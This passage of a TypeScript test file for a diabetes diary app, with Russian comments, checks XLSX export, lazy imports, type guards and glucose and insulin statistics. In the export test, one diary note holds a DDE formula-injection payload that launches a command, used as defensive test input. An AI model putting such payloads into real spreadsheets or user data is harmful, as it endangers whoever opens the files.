  const g = globalThis as { document?: unknown; URL?: unknown };
  const originalDoc = g.document;
  const originalURL = g.URL;
  try {
    let capturedBlob: Blob | null = null;
    g.document = {
      createElement: () => ({
        click: () => {},
        setAttribute: () => {},
        style: {},
      }),
      body: {
        appendChild: () => {},
        removeChild: () => {},
      },
    };
    g.URL = {
      createObjectURL: (blob: unknown) => {
        if (blob instanceof Blob) {
          capturedBlob = blob;
        }
        return 'blob:mock-url';
      },
      revokeObjectURL: () => {},
    };

    await exportEntriesToXLSX([
      {
        id: '1',
        date: '2026-11-02',
        time: '12:00',
        glucose: 6.2,
        carbs: null,
        xe: null,
        rinFast: null,
        tresiba: null,
        calories: null,
        notes: '=cmd|"/C calc"!A0', // Попытка инъекции формулы
        createdAt: Date.now(),
      },
    ]);

    assert.ok(capturedBlob, 'XLSX экспорт должен успешно сгенерировать Blob');
    // Даём write-excel-file завершить внутренний 100ms таймаут очистки DOM
    await new Promise((resolve) => setTimeout(resolve, 150));
  } finally {
    g.document = originalDoc;
    g.URL = originalURL;
  }
});

test('JS Loading Optimization: отсутствие статических импортов тяжёлых библиотек в критическом пути', async () => {
  const fs = await import('fs');
  const path = await import('path');

  // Проверяем excelImport.ts: нет статического import readXlsxFile from 'read-excel-file...'
  const importCode = fs.readFileSync(path.resolve('src/utils/excelImport.ts'), 'utf-8');
  assert.ok(
    !/^import\s+readXlsxFile\s+from/m.test(importCode),
    'excelImport.ts не должен содержать статический импорт readXlsxFile'
  );
  assert.ok(
    importCode.includes("import('read-excel-file/browser')"),
    'excelImport.ts должен использовать динамический import()'
  );

  // Проверяем excelExport.ts: нет статического import writeXlsxFile from 'write-excel-file...'
  const exportCode = fs.readFileSync(path.resolve('src/utils/excelExport.ts'), 'utf-8');
  assert.ok(
    !/^import\s+writeXlsxFile\s+from/m.test(exportCode),
    'excelExport.ts не должен содержать статический импорт writeXlsxFile'
  );
  assert.ok(
    exportCode.includes("import('write-excel-file/browser')"),
    'excelExport.ts должен использовать динамический import()'
  );

  // Проверяем DataManagementSection.tsx: нет статического импорта exportEntriesToXLSX
  const dataMgmtCode = fs.readFileSync(
    path.resolve('src/components/settings/DataManagementSection.tsx'),
    'utf-8'
  );
  assert.ok(
    !/^import\s+.*exportEntriesToXLSX.*from/m.test(dataMgmtCode),
    'DataManagementSection.tsx не должен статически импортировать exportEntriesToXLSX'
  );

  // Проверяем ExcelImportModal.tsx: нет статического импорта parseExcelDiary
  const modalCode = fs.readFileSync(path.resolve('src/components/ExcelImportModal.tsx'), 'utf-8');
  assert.ok(
    !/^import\s+.*parseExcelDiary.*from/m.test(modalCode),
    'ExcelImportModal.tsx не должен статически импортировать parseExcelDiary'
  );

  // Проверяем App.tsx: использует React.lazy для модальных окон
  const appCode = fs.readFileSync(path.resolve('src/App.tsx'), 'utf-8');
  assert.ok(appCode.includes('React.lazy'), 'App.tsx должен использовать React.lazy для ленивой загрузки');
  assert.ok(
    !/^import\s+.*SettingsModal.*from\s+['"]\.\/components\/SettingsModal['"]/m.test(appCode),
    'App.tsx не должен статически импортировать SettingsModal'
  );
  assert.ok(
    !/^import\s+.*ExcelImportModal.*from\s+['"]\.\/components\/ExcelImportModal['"]/m.test(appCode),
    'App.tsx не должен статически импортировать ExcelImportModal'
  );
});

test('TypeScript Refactoring: runtime type guards and safe unknown error handling', async () => {
  const { isDiaryTag, getDiaryTagConfig, getDiaryTagLabel } = await import('../constants/diaryTags');
  const { isTheme } = await import('./theme');
  const { isClientError, isConflictError } = await import('./diarySync');
  const { ApiError, sanitizeEntryForServer } = await import('../api/client');

  // 1. isDiaryTag type guard
  assert.equal(isDiaryTag('breakfast'), true);
  assert.equal(isDiaryTag('lunch'), true);
  assert.equal(isDiaryTag('other'), true);
  assert.equal(isDiaryTag('invalid_tag'), false);
  assert.equal(isDiaryTag(''), false);

  // 2. getDiaryTagConfig и getDiaryTagLabel с неизвестными значениями
  assert.equal(getDiaryTagConfig(null), null);
  assert.equal(getDiaryTagConfig('other'), null);
  assert.equal(getDiaryTagConfig('unknown_val'), null);
  assert.equal(getDiaryTagLabel(null), '');
  assert.equal(getDiaryTagLabel('breakfast'), 'Завтрак');
  assert.equal(getDiaryTagLabel('custom_label'), 'custom_label');

  // 3. isTheme type guard
  assert.equal(isTheme('light'), true);
  assert.equal(isTheme('dark'), true);
  assert.equal(isTheme('system'), true);
  assert.equal(isTheme('blue'), false);
  assert.equal(isTheme(null), false);
  assert.equal(isTheme(123), false);

  // 4. isClientError и isConflictError с различными типами unknown ошибок
  assert.equal(isClientError(new ApiError('Bad request', 400)), true);
  assert.equal(isClientError(new ApiError('Conflict', 409)), false);
  assert.equal(isClientError(new ApiError('Server error', 500)), false);
  assert.equal(isClientError({ status: 422 }), true);
  assert.equal(isClientError({ status: 409 }), false);
  assert.equal(isClientError(null), false);
  assert.equal(isClientError('random string error'), false);
  assert.equal(isClientError(new Error('Generic error')), false);

  assert.equal(isConflictError(new ApiError('Conflict', 409)), true);
  assert.equal(isConflictError({ status: 409 }), true);
  assert.equal(isConflictError(new ApiError('Not found', 404)), false);
  assert.equal(isConflictError(null), false);
  assert.equal(isConflictError(undefined), false);

  // 5. sanitizeEntryForServer типизация и удаление метаданных
  const fullEntry = {
    id: 'test-123',
    date: '2026-11-02',
    time: '12:00',
    glucose: 5.5,
    carbs: 24,
    xe: 2.0,
    rinFast: 3,
    tresiba: null,
    calories: 180,
    notes: 'Тест',
    createdAt: 123456789,
    _syncStatus: 'saved' as const,
    _syncError: 'Old error',
    _lastModified: 987654321,
  };
  const sanitized = sanitizeEntryForServer(fullEntry);
  assert.equal(sanitized.id, 'test-123');
  assert.equal('_syncStatus' in sanitized, false);
  assert.equal('_syncError' in sanitized, false);
  assert.equal('_lastModified' in sanitized, false);
  // Проверяем, что исходный объект не был мутирован
  assert.equal(fullEntry._syncStatus, 'saved');
});

test('Refactoring Medical Stats: единый источник расчетов для PDF, графиков и дневника (calculatePeriodStats vs calculateMonthlyStats)', () => {
  const entries: DiaryEntry[] = [
    {
      id: 'e1',
      date: '2026-11-01',
      time: '08:00',
      glucose: 3.8, // low
      carbs: 20,
      xe: 1.7,
      rinFast: 3,
      tresiba: 14,
      calories: 180,
      notes: 'Завтрак',
      tag: 'breakfast',
      createdAt: 1,
    },
    {
      id: 'e2',
      date: '2026-11-01',
      time: '13:00',
      glucose: 6.5, // normal
      carbs: 36,
      xe: 3.0,
      rinFast: 5,
      tresiba: null,
      calories: 350,
      notes: 'Обед',
      tag: 'lunch',
      createdAt: 2,
    },
    {
      id: 'e3',
      date: '2026-11-01',
      time: '19:00',
      glucose: 7.2, // normal
      carbs: 24,
      xe: 2.0,
      rinFast: 4,
      tresiba: null,
      calories: 250,
      notes: 'Ужин',
      tag: 'dinner',
      createdAt: 3,
    },
    {
      id: 'e4',
      date: '2026-11-02',
      time: '08:00',
      glucose: 11.0, // high
      carbs: 30,
      xe: 2.5,
      rinFast: 6,
      tresiba: 14,
      calories: 280,
      notes: 'Завтрак',
      tag: 'breakfast',
      createdAt: 4,
    },
    {
      id: 'e5',
      date: '2026-11-02',
      time: '14:00',
      glucose: 15.5, // very high
      carbs: 48,
      xe: 4.0,
      rinFast: 8,
      tresiba: null,
      calories: 450,
      notes: 'Обед',
      tag: 'lunch',
      createdAt: 5,
    },
  ];

  // Расчет через calculatePeriodStats (как в DoctorReportPdf и TelemetryBar)
  const periodStats = calculatePeriodStats(entries);

  // Расчет через calculateMonthlyStats (как в MonthlyCharts)
  const monthlyStats = calculateMonthlyStats(entries, '2026-11');

  // Совпадение ключевых медицинских метрик
  assert.equal(periodStats.totalEntries, monthlyStats.totalEntries);
  assert.equal(periodStats.glucoseCount, monthlyStats.glucoseCount);
  assert.equal(periodStats.avgGlucose, monthlyStats.avgGlucose);
  assert.equal(periodStats.estimatedHbA1c, monthlyStats.estimatedHbA1c);
  assert.deepEqual(periodStats.tir, monthlyStats.tir);
  assert.equal(periodStats.totalRinFast, monthlyStats.totalRinFast);
  assert.equal(periodStats.avgDailyRinFast, monthlyStats.avgDailyRinFast);
  assert.equal(periodStats.totalTresiba, monthlyStats.totalTresiba);
  assert.equal(periodStats.avgDailyTresiba, monthlyStats.avgDailyTresiba);
  assert.equal(periodStats.totalCarbs, monthlyStats.totalCarbs);
  assert.equal(periodStats.avgDailyCarbs, monthlyStats.avgDailyCarbs);
  assert.equal(periodStats.totalCalories, monthlyStats.totalCalories);
  assert.equal(periodStats.avgDailyCalories, monthlyStats.avgDailyCalories);
  assert.equal(periodStats.activeDaysCount, monthlyStats.activeDaysCount);
  assert.equal(periodStats.fullDaysCount, monthlyStats.fullDaysCount);

  // Проверка алиасов для совместимости с DoctorReportPdf
  assert.equal(periodStats.entriesCount, periodStats.totalEntries);
  assert.equal(periodStats.activeDays, periodStats.activeDaysCount);
  assert.equal(periodStats.avgRinFast, periodStats.avgDailyRinFast);
  assert.equal(periodStats.avgTresiba, periodStats.avgDailyTresiba);
  assert.equal(periodStats.avgCarbs, periodStats.avgDailyCarbs);
  assert.equal(periodStats.avgCalories, periodStats.avgDailyCalories);

  // Проверка точных расчетов
  // 5 замеров: 3.8 + 6.5 + 7.2 + 11.0 + 15.5 = 44.0 / 5 = 8.8 ммоль/л
  assert.equal(periodStats.avgGlucose, 8.8);
  assert.equal(periodStats.minGlucose, 3.8);
  assert.equal(periodStats.maxGlucose, 15.5);

  // TIR: low: 1 (20%), normal: 2 (40%), high: 1 (20%), veryHigh: 1 (20%)
  assert.equal(periodStats.tir.lowPercent, 20);
  assert.equal(periodStats.tir.normalPercent, 40);
  assert.equal(periodStats.tir.highPercent, 20);
  assert.equal(periodStats.tir.veryHighPercent, 20);

  // eHbA1c: (8.8 * 18.05 + 46.7) / 28.7 = (158.84 + 46.7) / 28.7 = 205.54 / 28.7 = 7.1616... -> 7.2
  assert.equal(periodStats.estimatedHbA1c, 7.2);
});

test('Refactoring Medical Stats: произвольные диапазоны дат (7d, 14d, custom range)', () => {
  const entries: DiaryEntry[] = [
    { id: '1', date: '2026-10-20', time: '10:00', glucose: 5.0, carbs: 12, xe: 1, rinFast: 2, tresiba: 10, calories: 100, notes: '', createdAt: 1 },
    { id: '2', date: '2026-10-31', time: '10:00', glucose: 6.0, carbs: 24, xe: 2, rinFast: 4, tresiba: 10, calories: 200, notes: '', createdAt: 2 },
    { id: '3', date: '2026-11-01', time: '10:00', glucose: 7.0, carbs: 36, xe: 3, rinFast: 6, tresiba: 10, calories: 300, notes: '', createdAt: 3 },
    { id: '4', date: '2026-11-02', time: '10:00', glucose: 8.0, carbs: 48, xe: 4, rinFast: 8, tresiba: 10, calories: 400, notes: '', createdAt: 4 },
  ];

  // Фильтр за 2 дня (2026-11-01 .. 2026-11-02)
  const last2Days = entries.filter((e) => e.date >= '2026-11-01');
  const stats2d = calculatePeriodStats(last2Days);
  assert.equal(stats2d.totalEntries, 2);
  assert.equal(stats2d.activeDaysCount, 2);
  assert.equal(stats2d.avgGlucose, 7.5);
  assert.equal(stats2d.minGlucose, 7.0);
  assert.equal(stats2d.maxGlucose, 8.0);
  assert.equal(stats2d.totalCarbs, 84); // 36 + 48
  assert.equal(stats2d.avgDailyCarbs, 42); // 84 / 2

  // Фильтр за 3 дня (2026-10-31 .. 2026-11-02)
  const last3Days = entries.filter((e) => e.date >= '2026-10-31');
  const stats3d = calculatePeriodStats(last3Days);
  assert.equal(stats3d.totalEntries, 3);
  assert.equal(stats3d.activeDaysCount, 3);
  assert.equal(stats3d.avgGlucose, 7.0); // (6 + 7 + 8) / 3
  assert.equal(stats3d.minGlucose, 6.0);
  assert.equal(stats3d.maxGlucose, 8.0);
});

test('Refactoring Medical Stats: пустые дневники и неполные записи (защита от деления на 0 и NaN)', () => {
  // 1. Пустой дневник
  const emptyStats = calculatePeriodStats([]);
  assert.equal(emptyStats.totalEntries, 0);
  assert.equal(emptyStats.glucoseCount, 0);
  assert.equal(emptyStats.activeDaysCount, 0);
  assert.equal(emptyStats.avgGlucose, null);
  assert.equal(emptyStats.minGlucose, null);
  assert.equal(emptyStats.maxGlucose, null);
  assert.equal(emptyStats.estimatedHbA1c, null);
  assert.equal(emptyStats.tir.normalPercent, 0);
  assert.equal(emptyStats.tir.lowPercent, 0);
  assert.equal(emptyStats.tir.highPercent, 0);
  assert.equal(emptyStats.tir.veryHighPercent, 0);
  assert.equal(emptyStats.totalRinFast, 0);
  assert.equal(emptyStats.avgDailyRinFast, 0);
  assert.equal(emptyStats.totalTresiba, 0);
  assert.equal(emptyStats.avgDailyTresiba, 0);
  assert.equal(emptyStats.totalCarbs, 0);
  assert.equal(emptyStats.avgDailyCarbs, 0);
  assert.equal(emptyStats.totalXE, 0);
  assert.equal(emptyStats.avgDailyXE, 0);
  assert.equal(emptyStats.totalCalories, 0);
  assert.equal(emptyStats.avgDailyCalories, 0);

  // 2. Записи без глюкозы (только укол или перекус)
  const nonGlucoseEntries: DiaryEntry[] = [
    { id: '1', date: '2026-11-02', time: '12:00', glucose: null, carbs: 50, xe: 4.2, rinFast: 5, tresiba: null, calories: 300, notes: '', createdAt: 1 },
    { id: '2', date: '2026-11-02', time: '22:00', glucose: 0, carbs: 0, xe: 0, rinFast: null, tresiba: 14, calories: 0, notes: '', createdAt: 2 },
  ];
  const statsNonGlucose = calculatePeriodStats(nonGlucoseEntries);
  assert.equal(statsNonGlucose.totalEntries, 2);
  assert.equal(statsNonGlucose.glucoseCount, 0);
  assert.equal(statsNonGlucose.avgGlucose, null);
  assert.equal(statsNonGlucose.minGlucose, null);
  assert.equal(statsNonGlucose.maxGlucose, null);
  assert.equal(statsNonGlucose.estimatedHbA1c, null);
  assert.equal(statsNonGlucose.tir.normalPercent, 0);
  assert.equal(statsNonGlucose.totalRinFast, 5);
  assert.equal(statsNonGlucose.totalTresiba, 14);
  assert.equal(statsNonGlucose.totalCarbs, 50);
  assert.equal(statsNonGlucose.totalXE, 4.2);
});

test('Refactoring Medical Stats: граничные значения глюкозы и кастомные диапазоны', () => {
  const customSettings = {
    patientName: 'Тест',
    diabetesType: '1' as const,
    xeRatio: 10,
    targetLow: 4.0,
    targetHigh: 8.0,
    hypoThreshold: 3.5,
    severeHyperThreshold: 12.0,
  };

  const boundaryEntries: DiaryEntry[] = [
    { id: '1', date: '2026-11-01', time: '08:00', glucose: 3.5, carbs: null, xe: null, rinFast: null, tresiba: null, calories: null, notes: '', createdAt: 1 }, // ровно hypoThreshold => low
    { id: '2', date: '2026-11-01', time: '10:00', glucose: 4.0, carbs: null, xe: null, rinFast: null, tresiba: null, calories: null, notes: '', createdAt: 2 }, // ровно targetLow => normal
    { id: '3', date: '2026-11-01', time: '12:00', glucose: 8.0, carbs: null, xe: null, rinFast: null, tresiba: null, calories: null, notes: '', createdAt: 3 }, // ровно targetHigh => normal
    { id: '4', date: '2026-11-01', time: '14:00', glucose: 8.1, carbs: null, xe: null, rinFast: null, tresiba: null, calories: null, notes: '', createdAt: 4 }, // чуть выше targetHigh => high
    { id: '5', date: '2026-11-01', time: '16:00', glucose: 12.0, carbs: null, xe: null, rinFast: null, tresiba: null, calories: null, notes: '', createdAt: 5 }, // ровно severeHyper => high
    { id: '6', date: '2026-11-01', time: '18:00', glucose: 12.1, carbs: null, xe: null, rinFast: null, tresiba: null, calories: null, notes: '', createdAt: 6 }, // выше severeHyper => very_high
  ];

  const stats = calculatePeriodStats(boundaryEntries, customSettings);
  assert.equal(stats.glucoseCount, 6);
  assert.equal(stats.minGlucose, 3.5);
  assert.equal(stats.maxGlucose, 12.1);
  assert.equal(stats.tir.lowCount, 1);
  assert.equal(stats.tir.normalCount, 2);
  assert.equal(stats.tir.highCount, 2);
  assert.equal(stats.tir.veryHighCount, 1);
});

test('Refactoring Medical Stats: отсутствие двойного подсчета записей и доз', () => {
  const entriesSameDay: DiaryEntry[] = [
    { id: '1', date: '2026-11-02', time: '08:00', glucose: 5.0, carbs: 20, xe: 1.5, rinFast: 3, tresiba: 12, calories: 150, notes: '', createdAt: 1 },
    { id: '2', date: '2026-11-02', time: '12:00', glucose: 6.0, carbs: 30, xe: 2.5, rinFast: 4, tresiba: null, calories: 250, notes: '', createdAt: 2 },
    { id: '3', date: '2026-11-02', time: '18:00', glucose: 7.0, carbs: 40, xe: 3.0, rinFast: 5, tresiba: null, calories: 350, notes: '', createdAt: 3 },
  ];

  const stats = calculatePeriodStats(entriesSameDay);
  assert.equal(stats.totalEntries, 3);
  assert.equal(stats.activeDaysCount, 1); // Все записи в 1 день
  assert.equal(stats.totalRinFast, 12); // 3 + 4 + 5 = 12
  assert.equal(stats.totalTresiba, 12);
  assert.equal(stats.totalCarbs, 90); // 20 + 30 + 40 = 90
  assert.equal(stats.avgDailyCarbs, 90); // 90 / 1 день
  assert.equal(stats.totalXE, 7.0); // 1.5 + 2.5 + 3.0 = 7.0
  assert.equal(stats.avgDailyXE, 7.0);
  assert.equal(stats.totalCalories, 750); // 150 + 250 + 350 = 750
  assert.equal(stats.avgDailyCalories, 750);
});

